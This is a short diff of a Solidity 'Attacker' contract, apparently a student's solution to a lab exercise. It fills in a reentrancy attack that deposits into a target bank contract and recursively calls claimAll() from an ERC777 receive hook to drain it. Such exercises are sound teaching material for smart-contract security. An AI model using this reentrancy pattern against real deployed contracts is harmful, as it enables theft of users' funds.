@@ -37,8 +37,9 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
 		//YOUR CODE TO START ATTACK GOES HERE
-    	bank.deposit{value: amt}();
-	    bank.claimAll();
+		depth = 0;
+		bank.deposit{value: amt}();
+		bank.claimAll();
 
 	}
 
@@ -63,10 +64,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata operatorData
 	) external {
 		//YOUR CODE TO RECURSE GOES HERE
-    	if (from == address(bank) && depth < max_depth) {
-        	depth++;
-        	emit Recurse(depth);
-        	bank.claimAll();
+		if (msg.sender == address(bank.token()) && depth < max_depth) {
+			depth++;
+			emit Recurse(depth);
+			bank.claimAll();
 		}
 
 }
